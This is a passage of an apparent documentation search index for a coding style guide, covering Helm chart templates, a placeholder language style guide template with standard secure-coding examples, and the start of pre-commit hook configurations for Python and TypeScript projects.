quote }}\n        {{- end }}\n      secretName: {{ .secretName }}\n    {{- end }}\n  {{- end }}\n  rules:\n    {{- range .Values.ingress.hosts }}\n    - host: {{ .host | quote }}\n      http:\n        paths:\n          {{- range .paths }}\n          - path: {{ .path }}\n            pathType: {{ .pathType }}\n            backend:\n              service:\n                name: {{ include \"my-app.fullname\" $ }}\n                port:\n                  number: {{ $.Values.service.port }}\n          {{- end }}\n    {{- end }}\n{{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatesconfigmapyaml","title":"templates/configmap.yaml","text":"<pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: {{ include \"my-app.fullname\" . }}-config\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\ndata:\n  logLevel: {{ .Values.config.logLevel | quote }}\n  port: {{ .Values.config.port | quote }}\n  environment: {{ .Values.config.environment | quote }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatessecretyaml","title":"templates/secret.yaml","text":"<pre><code>{{- if .Values.secrets.enabled }}\napiVersion: v1\nkind: Secret\nmetadata:\n  name: {{ include \"my-app.fullname\" . }}-secret\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\ntype: Opaque\ndata:\n  {{- range $key, $value := .Values.secrets.data }}\n  {{ $key }}: {{ $value | b64enc | quote }}\n  {{- end }}\n{{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatesserviceaccountyaml","title":"templates/serviceaccount.yaml","text":"<pre><code>{{- if .Values.serviceAccount.create -}}\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: {{ include \"my-app.serviceAccountName\" . }}\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\n  {{- with .Values.serviceAccount.annotations }}\n  annotations:\n    {{- toYaml . | nindent 4 }}\n  {{- end }}\n{{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templateshpayaml","title":"templates/hpa.yaml","text":"<pre><code>{{- if .Values.autoscaling.enabled }}\napiVersion: autoscaling/v2\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: {{ include \"my-app.fullname\" . }}\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\nspec:\n  scaleTargetRef:\n    apiVersion: apps/v1\n    kind: Deployment\n    name: {{ include \"my-app.fullname\" . }}\n  minReplicas: {{ .Values.autoscaling.minReplicas }}\n  maxReplicas: {{ .Values.autoscaling.maxReplicas }}\n  metrics:\n    {{- if .Values.autoscaling.targetCPUUtilizationPercentage }}\n    - type: Resource\n      resource:\n        name: cpu\n        target:\n          type: Utilization\n          averageUtilization: {{ .Values.autoscaling.targetCPUUtilizationPercentage }}\n    {{- end }}\n    {{- if .Values.autoscaling.targetMemoryUtilizationPercentage }}\n    - type: Resource\n      resource:\n        name: memory\n        target:\n          type: Utilization\n          averageUtilization: {{ .Values.autoscaling.targetMemoryUtilizationPercentage }}\n    {{- end }}\n{{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatespdbyaml","title":"templates/pdb.yaml","text":"<pre><code>{{- if .Values.podDisruptionBudget.enabled }}\napiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: {{ include \"my-app.fullname\" . }}\n  labels:\n    {{- include \"my-app.labels\" . | nindent 4 }}\nspec:\n  minAvailable: {{ .Values.podDisruptionBudget.minAvailable }}\n  selector:\n    matchLabels:\n      {{- include \"my-app.selectorLabels\" . | nindent 6 }}\n{{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#templatesnotestxt","title":"templates/NOTES.txt","text":"<pre><code>1. Get the application URL by running these commands:\n{{- if .Values.ingress.enabled }}\n{{- range $host := .Values.ingress.hosts }}\n  {{- range .paths }}\n  http{{ if $.Values.ingress.tls }}s{{ end }}://{{ $host.host }}{{ .path }}\n  {{- end }}\n{{- end }}\n{{- else if contains \"NodePort\" .Values.service.type }}\n  export NODE_PORT=$(kubectl get --namespace {{ .Release.Namespace }} -o jsonpath=\"{.spec.ports[0].nodePort}\" services {{ include \"my-app.fullname\" . }})\n  export NODE_IP=$(kubectl get nodes --namespace {{ .Release.Namespace }} -o jsonpath=\"{.items[0].status.addresses[0].address}\")\n  echo http://$NODE_IP:$NODE_PORT\n{{- else if contains \"LoadBalancer\" .Values.service.type }}\n     NOTE: It may take a few minutes for the LoadBalancer IP to be available.\n           You can watch the status of by running 'kubectl get --namespace {{ .Release.Namespace }} svc -w {{ include \"my-app.fullname\" . }}'\n  export SERVICE_IP=$(kubectl get svc --namespace {{ .Release.Namespace }} {{ include \"my-app.fullname\" . }} --template \"{{\"{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}\"}}\")\n  echo http://$SERVICE_IP:{{ .Values.service.port }}\n{{- else if contains \"ClusterIP\" .Values.service.type }}\n  export POD_NAME=$(kubectl get pods --namespace {{ .Release.Namespace }} -l \"app.kubernetes.io/name={{ include \"my-app.name\" . }},app.kubernetes.io/instance={{ .Release.Name }}\" -o jsonpath=\"{.items[0].metadata.name}\")\n  export CONTAINER_PORT=$(kubectl get pod --namespace {{ .Release.Namespace }} $POD_NAME -o jsonpath=\"{.spec.containers[0].ports[0].containerPort}\")\n  echo \"Visit http://127.0.0.1:8080 to use your application\"\n  kubectl --namespace {{ .Release.Namespace }} port-forward $POD_NAME 8080:$CONTAINER_PORT\n{{- end }}\n\n2. Check the deployment status:\n  kubectl get deployment --namespace {{ .Release.Namespace }} {{ include \"my-app.fullname\" . }}\n\n3. View application logs:\n  kubectl logs --namespace {{ .Release.Namespace }} -l app.kubernetes.io/name={{ include \"my-app.name\" . }} -f\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#helmignore","title":".helmignore","text":"<pre><code>## Patterns to ignore when building packages\n.git/\n.gitignore\n.DS_Store\n.idea/\n*.swp\n*.bak\n*.tmp\n*.orig\n*~\n.vscode/\n.project\n.settings/\n\n## CI/CD\n.github/\n.gitlab-ci.yml\n\n## Documentation\nREADME.md\nCONTRIBUTING.md\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#best-practices","title":"Best Practices","text":"","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#using-helper-templates","title":"Using Helper Templates","text":"<pre><code>## In _helpers.tpl\n{{- define \"my-app.database.url\" -}}\n{{- if .Values.postgresql.enabled }}\n{{- printf \"postgresql://%s:%s@%s:5432/%s\" .Values.postgresql.auth.username .Values.postgresql.auth.password (include \"my-app.fullname\" .) .Values.postgresql.auth.database }}\n{{- else }}\n{{- .Values.externalDatabase.url }}\n{{- end }}\n{{- end }}\n\n## In deployment.yaml\nenv:\n  - name: DATABASE_URL\n    value: {{ include \"my-app.database.url\" . | quote }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#checksum-annotations","title":"Checksum Annotations","text":"<pre><code>## Force pod restart when ConfigMap or Secret changes\nannotations:\n  checksum/config: {{ include (print $.Template.BasePath \"/configmap.yaml\") . | sha256sum }}\n  checksum/secret: {{ include (print $.Template.BasePath \"/secret.yaml\") . | sha256sum }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#conditional-resources","title":"Conditional Resources","text":"<pre><code>## Only create resource if enabled\n{{- if .Values.ingress.enabled }}\napiVersion: networking.k8s.io/v1\nkind: Ingress\n## ...\n{{- end }}\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#useful-commands","title":"Useful Commands","text":"<pre><code>## Create new chart\nhelm create my-app\n\n## Lint chart\nhelm lint my-app\n\n## Validate templates\nhelm template my-app ./my-app\n\n## Dry run install\nhelm install my-app ./my-app --dry-run --debug\n\n## Install chart\nhelm install my-app ./my-app\n\n## Install with custom values\nhelm install my-app ./my-app -f values-prod.yaml\n\n## Upgrade release\nhelm upgrade my-app ./my-app\n\n## Upgrade with custom values\nhelm upgrade my-app ./my-app -f values-prod.yaml\n\n## Rollback release\nhelm rollback my-app 1\n\n## Uninstall release\nhelm uninstall my-app\n\n## List releases\nhelm list\n\n## Get release status\nhelm status my-app\n\n## Get release values\nhelm get values my-app\n\n## Package chart\nhelm package my-app\n\n## Test chart\nhelm test my-app\n</code></pre>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#references","title":"References","text":"","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#official-documentation","title":"Official Documentation","text":"<ul> <li>Helm Documentation</li> <li>Chart Template Guide</li> <li>Best Practices</li> </ul>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/helm_chart_template/#tools","title":"Tools","text":"<ul> <li>helm-docs - Generate documentation</li> <li>kubeval - Validate Kubernetes YAML</li> <li>helm-diff - Preview changes</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["helm","kubernetes","k8s","charts","deployment"]},{"location":"04_templates/language_guide_template/","title":"[Language Name] Style Guide","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#language-name-style-guide","title":"[Language Name] Style Guide","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#language-overview","title":"Language Overview","text":"<p>[Language Name] is a [compiled/interpreted] [programming/scripting/markup] language primarily used for [use cases: web development, data analysis, infrastructure automation, etc.].</p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: [Object-oriented, functional, procedural, declarative, multi-paradigm]</li> <li>Typing: [Static/dynamic, strong/weak]</li> <li>Runtime: [JVM, Node.js, Python interpreter, compiled binary, etc.]</li> <li>Primary Use Cases:</li> <li>[Use case 1: e.g., Backend web services]</li> <li>[Use case 2: e.g., Data processing pipelines]</li> <li>[Use case 3: e.g., Infrastructure as Code]</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#this-style-guide-covers","title":"This Style Guide Covers","text":"<ul> <li>Naming conventions for variables, functions, classes, and files</li> <li>Code formatting and structure standards</li> <li>Documentation requirements and best practices</li> <li>Testing standards and coverage requirements</li> <li>Dependency management and import organization</li> <li>Security best practices and common vulnerabilities</li> <li>Performance optimization guidelines</li> <li>Anti-patterns to avoid</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#naming-conventions","title":"Naming Conventions","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#variables","title":"Variables","text":"<p>Convention: [snake_case, camelCase, PascalCase]</p> <p>```[language-extension] // Good [example_good_variable_name]</p> <p>// Bad [example_bad_variable_name] <pre><code>**Guidelines**:\n\n- Use descriptive names that indicate purpose\n- Avoid single-letter names except for loop counters (i, j, k)\n- Boolean variables should ask a question: `is_active`, `has_permission`\n- Avoid abbreviations unless universally understood\n\n### Constants\n\n**Convention**: [UPPER_SNAKE_CASE, SCREAMING_SNAKE_CASE]\n\n```[language-extension]\n// Good\n[EXAMPLE_CONSTANT] = [value]\n\n// Bad\n[example_bad_constant] = [value]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#functionsmethods","title":"Functions/Methods","text":"<p>Convention: [snake_case, camelCase]</p> <p>```[language-extension] // Good example_function_name {     // Implementation }</p> <p>// Bad bad_function_name {     // Implementation } <pre><code>**Guidelines**:\n\n- Use verb-noun format: `get_user()`, `calculate_total()`, `validate_input()`\n- Keep names concise but descriptive\n- Avoid generic names like `process()`, `handle()`, `do_stuff()`\n\n### Classes/Types\n\n**Convention**: [PascalCase, UpperCamelCase]\n\n```[language-extension]\n// Good\nclass [ExampleClassName] {\n    // Implementation\n}\n\n// Bad\nclass [bad_class_name] {\n    // Implementation\n}\n</code></pre></p> <p>Guidelines:</p> <ul> <li>Use noun phrases: <code>UserRepository</code>, <code>PaymentProcessor</code></li> <li>Avoid prefixes like <code>C</code>, <code>Cls</code>, <code>I</code> (unless language convention)</li> <li>Exception classes should end with <code>Error</code> or <code>Exception</code></li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#files-and-modules","title":"Files and Modules","text":"<p>Convention: [snake_case.ext, kebab-case.ext, PascalCase.ext]</p> <pre><code>// Good\n[example_file_name].[ext]\n[another-example].[ext]\n\n// Bad\n[BadFileName].[ext]\n[bad.file.name].[ext]\n</code></pre> <p>Guidelines:</p> <ul> <li>Match file name to primary class/module name (if applicable)</li> <li>Use lowercase with separators</li> <li>Group related files in directories</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#code-formatting","title":"Code Formatting","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#indentation","title":"Indentation","text":"<ul> <li>Style: [Spaces only, Tabs, Mixed]</li> <li>Size: [2 spaces, 4 spaces, 1 tab]</li> </ul> <p>```[language-extension] // Good [example with proper indentation]     [nested content]         [more nested content]</p> <p>// Bad [example with improper indentation] <pre><code>### Line Length\n\n- **Maximum**: [80, 100, 120] characters per line\n- **Exception**: Long strings, URLs, import statements\n\n```[language-extension]\n// Good - line broken appropriately\n[example of properly broken long line]\n    [continuation]\n\n// Bad - line too long\n[example of line that is too long and should be broken up for readability]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#blank-lines","title":"Blank Lines","text":"<ul> <li>Between functions/methods: [1, 2] blank lines</li> <li>Within functions: Use sparingly to separate logical blocks</li> <li>File end: Exactly 1 blank line</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#braces-and-brackets","title":"Braces and Brackets","text":"<p>Style: [K&amp;R, Allman, GNU, etc.]</p> <p>```[language-extension] // Good [example with proper brace placement] {     [content] }</p> <p>// Bad [example with improper brace placement] {     [content] } <pre><code>### Spacing\n\n```[language-extension]\n// Good spacing\n[example = value + other_value]\nif ([condition]) {\n    [statement]\n}\n\n// Bad spacing\n[example=value+other_value]\nif([condition]){\n    [statement]\n}\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#documentation-standards","title":"Documentation Standards","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#module-level-documentation","title":"Module-Level Documentation","text":"<p>Required for: All files/modules</p> <p>```[language-extension] [comment syntax] @module [module_name] @description [Brief description of module purpose] @dependencies [list, of, dependencies] @version [1.0.0] @author [Author Name] @last_updated [YYYY-MM-DD] [end comment syntax] <pre><code>### Function/Method Documentation\n\n**Required for**: Public functions, complex logic\n\n```[language-extension]\n[comment syntax]\n[Function description]\n\n@param {[type]} [parameter_name] - [Parameter description]\n@param {[type]} [another_parameter] - [Another description]\n@returns {[type]} [Return value description]\n@throws {[ErrorType]} [When this error is thrown]\n@example\n    [example_usage]\n[end comment syntax]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#inline-comments","title":"Inline Comments","text":"<p>Guidelines:</p> <ul> <li>Explain why, not what (code should be self-explanatory)</li> <li>Place comments above the code they describe</li> <li>Keep comments up-to-date with code changes</li> </ul> <p>```[language-extension] // Good - explains why // Use exponential backoff to avoid overwhelming the API [retry_logic]</p> <p>// Bad - explains what (obvious from code) // Increment counter by 1 counter += 1 <pre><code>## Error Handling\n\n### Exception Handling\n\n**Strategy**: [Fail-fast, graceful degradation, retry logic]\n\n```[language-extension]\n// Good\ntry {\n    [risky_operation]\n} catch ([SpecificException] e) {\n    [handle specific error]\n} catch ([AnotherException] e) {\n    [handle another error]\n} finally {\n    [cleanup resources]\n}\n\n// Bad\ntry {\n    [risky_operation]\n} catch ([Exception] e) {\n    // Silent failure\n}\n</code></pre></p> <p>Guidelines:</p> <ul> <li>Catch specific exceptions, not generic <code>Exception</code></li> <li>Always log errors with context (user ID, request ID, timestamp)</li> <li>Clean up resources in <code>finally</code> blocks</li> <li>Re-throw exceptions if you can't handle them properly</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#error-messages","title":"Error Messages","text":"<p>```[language-extension] // Good - specific, actionable throw new ValidationError</p> <p>// Bad - vague, unhelpful throw new Error <pre><code>### Logging\n\n**Levels**: DEBUG, INFO, WARN, ERROR, CRITICAL\n\n```[language-extension]\n// Good\nlogger.error(\"Failed to connect to database\", {\n    error: error.message,\n    host: db_host,\n    user: db_user,\n    timestamp: new Date()\n})\n\n// Bad\nconsole.log(\"error\")\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#testing-requirements","title":"Testing Requirements","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#coverage-requirements","title":"Coverage Requirements","text":"<ul> <li>Unit Tests: [80%, 90%, 100%] coverage for business logic</li> <li>Integration Tests: All API endpoints, database operations</li> <li>End-to-End Tests: Critical user flows</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#test-file-organization","title":"Test File Organization","text":"<pre><code>[src or main directory]/\n    [module_name].[ext]\n\n[tests or test directory]/\n    [module_name]_test.[ext]\n    [module_name].test.[ext]\n</code></pre>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#test-naming","title":"Test Naming","text":"<p>Convention: [test_should_behavior_when_condition, describe_behavior_it_should_do_something]</p> <p>```[language-extension] // Good test_should_calculate_discount_when_user_is_premium {     // Test implementation }</p> <p>// Bad test_discount {     // Test implementation } <pre><code>### Test Structure\n\n**Pattern**: [Arrange-Act-Assert, Given-When-Then]\n\n```[language-extension]\ntest_[example_test]() {\n    // Arrange: Set up test data\n    [setup_code]\n\n    // Act: Execute the function\n    [result] = [function_call]\n\n    // Assert: Verify the result\n    [assertion]\n}\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#mocking-and-stubbing","title":"Mocking and Stubbing","text":"<p>```[language-extension] // Good - mock external dependencies [mock_external_api] [result] = [function_that_calls_api] [verify_mock_was_called]</p> <p>// Bad - make real API calls in tests [result] = [function_that_calls_real_api]  // Flaky, slow, expensive <pre><code>## Dependencies and Imports\n\n### Import Organization\n\n**Order**: [standard library, third-party, local modules]\n\n```[language-extension]\n// Good\n[standard_library_imports]\n\n[third_party_imports]\n\n[local_module_imports]\n\n// Bad - mixed order\n[random_import_order]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#dependency-declaration","title":"Dependency Declaration","text":"<p>```[language-extension] // Good - pinned versions [dependency_name] == [exact.version.number] [another_dependency] &gt;= [minimum.version], &lt; [maximum.version]</p> <p>// Bad - unpinned versions [dependency_name]  // Any version (dangerous) <pre><code>### Avoiding Circular Dependencies\n\n```[language-extension]\n// Bad - circular dependency\n[ModuleA] imports [ModuleB]\n[ModuleB] imports [ModuleA]\n\n// Good - extract common code to third module\n[ModuleA] imports [SharedModule]\n[ModuleB] imports [SharedModule]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#performance-considerations","title":"Performance Considerations","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#algorithm-complexity","title":"Algorithm Complexity","text":"<ul> <li>Prefer O(1) or O(log n) algorithms when possible</li> <li>Avoid O(n\u00b2) or worse unless dataset is guaranteed small</li> <li>Document complexity in comments for non-obvious algorithms</li> </ul> <p>```[language-extension] // Good - O(1) lookup [hash_map_lookup]</p> <p>// Bad - O(n) lookup when hash map available [linear_search_through_list] <pre><code>### Resource Management\n\n```[language-extension]\n// Good - explicit resource cleanup\n[open_resource]\ntry {\n    [use_resource]\n} finally {\n    [close_resource]\n}\n\n// Bad - relying on garbage collector\n[open_resource_without_cleanup]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#caching","title":"Caching","text":"<p>```[language-extension] // Good - cache expensive operations if ([cache_contains_key]) {     return [cached_value] } [result] = [expensive_computation] [cache_result] return [result] <pre><code>### Lazy Loading\n\n```[language-extension]\n// Good - load only when needed\nif ([resource_is_needed]) {\n    [load_resource]\n}\n\n// Bad - eager loading everything\n[load_all_resources_upfront]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#security-best-practices","title":"Security Best Practices","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#input-validation","title":"Input Validation","text":"<p>```[language-extension] // Good - validate and sanitize [validated_input] = validate_and_sanitize if (![is_valid]) {     throw new ValidationError }</p> <p>// Bad - trust user input [use_raw_user_input_directly] <pre><code>### SQL Injection Prevention\n\n```[language-extension]\n// Good - parameterized queries\n[query] = \"SELECT * FROM users WHERE id = ?\"\n[execute_query]([query], [user_id])\n\n// Bad - string concatenation\n[query] = \"SELECT * FROM users WHERE id = \" + [user_id]  // Vulnerable!\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#secret-management","title":"Secret Management","text":"<p>```[language-extension] // Good - environment variables or secret manager [api_key] = get_from_environment</p> <p>// Bad - hardcoded secrets [api_key] = \"sk_live_abc123xyz...\"  // Never do this! <pre><code>### Authentication and Authorization\n\n```[language-extension]\n// Good - check permissions before action\nif (![user_has_permission]([required_permission])) {\n    throw new [ForbiddenError](\"Insufficient permissions\")\n}\n[perform_protected_action]\n\n// Bad - assume user has permission\n[perform_protected_action]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#anti-patterns-to-avoid","title":"Anti-Patterns to Avoid","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#anti-pattern-name-1","title":"[Anti-Pattern Name 1]","text":"<p>Description: [Brief description of the anti-pattern]</p> <p>Why It's Bad: [Explanation of negative consequences]</p> <p>```[language-extension] // Bad [example_of_anti_pattern]</p> <p>// Good [correct_alternative] <pre><code>### [Anti-Pattern Name 2]\n\n**Description**: [Brief description]\n\n**Why It's Bad**: [Explanation]\n\n```[language-extension]\n// Bad\n[example_of_anti_pattern]\n\n// Good\n[correct_alternative]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#anti-pattern-name-3","title":"[Anti-Pattern Name 3]","text":"<p>Description: [Brief description]</p> <p>Why It's Bad: [Explanation]</p> <p>```[language-extension] // Bad [example_of_anti_pattern]</p> <p>// Good [correct_alternative] <pre><code>## Recommended Tools\n\n### Formatters\n\n- **[Tool Name]**: [Description and usage]\n  - Installation: `[install_command]`\n  - Configuration: [config_file_name]\n  - Run: `[run_command]`\n\n### Linters\n\n- **[Linter Name]**: [Description and what it checks]\n  - Installation: `[install_command]`\n  - Configuration: [config_file_name]\n  - Run: `[run_command]`\n\n### Type Checkers (if applicable)\n\n- **[Type Checker Name]**: [Description]\n  - Installation: `[install_command]`\n  - Configuration: [config_file_name]\n  - Run: `[run_command]`\n\n### IDE Extensions\n\n- **[Extension Name]** ([IDE]): [Description]\n- **[Another Extension]** ([IDE]): [Description]\n\n### Pre-commit Configuration\n\n```yaml\n## .pre-commit-config.yaml\nrepos:\n  - repo: [formatter_repo_url]\n    hooks:\n      - id: [formatter_hook_id]\n  - repo: [linter_repo_url]\n    hooks:\n      - id: [linter_hook_id]\n</code></pre></p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#examples","title":"Examples","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#example-1-use-case-name","title":"Example 1: [Use Case Name]","text":"<p>Scenario: [Brief description of the use case]</p> <p>```[language-extension] [complete_example_with_comments] <pre><code>**Key Points**:\n\n- [Point 1 about this example]\n- [Point 2 about this example]\n- [Point 3 about this example]\n\n### Example 2: [Another Use Case]\n\n**Scenario**: [Brief description]\n\n```[language-extension]\n[complete_example_with_comments]\n</code></pre></p> <p>Key Points:</p> <ul> <li>[Point 1]</li> <li>[Point 2]</li> <li>[Point 3]</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#example-3-common-pattern","title":"Example 3: [Common Pattern]","text":"<p>Scenario: [Brief description]</p> <p><code>[language-extension] [complete_example_with_comments]</code></p> <p>Key Points:</p> <ul> <li>[Point 1]</li> <li>[Point 2]</li> <li>[Point 3]</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#references","title":"References","text":"","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#official-documentation","title":"Official Documentation","text":"<ul> <li>Language Official Docs</li> <li>Language Style Guide</li> <li>Language Best Practices</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#community-style-guides","title":"Community Style Guides","text":"<ul> <li>Company/Organization Style Guide</li> <li>Popular Open Source Project Style</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#books-and-resources","title":"Books and Resources","text":"<ul> <li>Book Title - [Author Name]</li> <li>Another Resource</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#tools-and-utilities","title":"Tools and Utilities","text":"<ul> <li>Formatter Documentation</li> <li>Linter Documentation</li> <li>Testing Framework</li> </ul>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/language_guide_template/#related-guides","title":"Related Guides","text":"<ul> <li>Metadata Schema Reference</li> </ul> <p>Template Version: 1.0.0 Last Updated: 2025-10-28 Maintainer: Tyler Dukes</p> <p>Note: This template should be customized for each language. Delete placeholder text and fill in language-specific examples, conventions, and best practices.</p>","tags":["language-name","style-guide","best-practices","standards"]},{"location":"04_templates/precommit_config_template/","title":"Pre-commit Config Template","text":"","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#overview","title":"Overview","text":"<p>This document provides comprehensive <code>.pre-commit-config.yaml</code> templates for automated code quality checks across all languages covered in this style guide. Pre-commit hooks run before each commit to catch issues early and maintain code quality standards.</p>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#installation","title":"Installation","text":"<pre><code>## Install pre-commit\npip install pre-commit\n\n## Install the git hook scripts\npre-commit install\n\n## (Optional) Run against all files\npre-commit run --all-files\n\n## (Optional) Update hooks to latest versions\npre-commit autoupdate\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#python-projects","title":"Python Projects","text":"<pre><code>repos:\n  # General hooks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-toml\n      - id: check-json\n      - id: check-added-large-files\n        args: ['--maxkb=1000']\n      - id: check-merge-conflict\n      - id: check-case-conflict\n      - id: check-docstring-first\n      - id: debug-statements\n      - id: name-tests-test\n        args: ['--pytest-test-first']\n      - id: requirements-txt-fixer\n\n  # Black - Code formatter\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.10\n        args: ['--line-length=100']\n\n  # Ruff - Fast Python linter\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: v0.1.9\n    hooks:\n      - id: ruff\n        args: ['--fix', '--exit-non-zero-on-fix']\n\n  # MyPy - Static type checker\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.8.0\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-all]\n        args: ['--strict', '--ignore-missing-imports']\n\n  # isort - Import sorting (alternative to Ruff's isort)\n  - repo: https://github.com/pycqa/isort\n    rev: 5.13.2\n    hooks:\n      - id: isort\n        args: ['--profile=black', '--line-length=100']\n\n  # Bandit - Security linting\n  - repo: https://github.com/PyCQA/bandit\n    rev: 1.7.6\n    hooks:\n      - id: bandit\n        args: ['-c', 'pyproject.toml']\n        additional_dependencies: ['bandit[toml]']\n\n  # Safety - Check dependencies for known security vulnerabilities\n  - repo: https://github.com/Lucas-C/pre-commit-hooks-safety\n    rev: v1.3.3\n    hooks:\n      - id: python-safety-dependencies-check\n\n  # Pylint - Additional linting\n  - repo: https://github.com/pycqa/pylint\n    rev: v3.0.3\n    hooks:\n      - id: pylint\n        args: ['--rcfile=.pylintrc']\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#typescript-javascript-projects","title":"TypeScript / JavaScript Projects","text":"<pre><code>repos:\n  # General hooks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-json\n      - id: check-added-large-files\n      - id: check-merge-conflict\n\n  # ESLint - JavaScript/TypeScript linting\n  - repo: https://github.com/pre-commit/mirrors-eslint\n    rev: v8.56.0\n    hooks:\n      - id: eslint\n        files: \\.(js|ts|jsx|tsx)$\n        types: [file]\n        additional_dependencies:\n          - eslint@8.56.0\n          - '@typescript-eslint/parser@6.19.0'\n          - 